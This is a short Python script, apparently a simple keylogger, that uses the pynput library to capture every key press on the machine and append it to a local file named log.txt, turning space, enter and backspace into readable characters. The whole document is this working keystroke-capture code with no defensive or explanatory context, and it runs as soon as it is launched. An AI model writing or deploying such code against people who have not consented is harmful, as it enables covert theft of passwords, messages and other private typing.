from pynput.keyboard import Listener


def log_key(key):
    key = str(key).replace("'","")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ' '
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.backspace':
        key = '[BS]'

    with open("log.txt","a") as file:
        file.write(key)



with Listener(on_press=log_key) as obj:
    obj.join()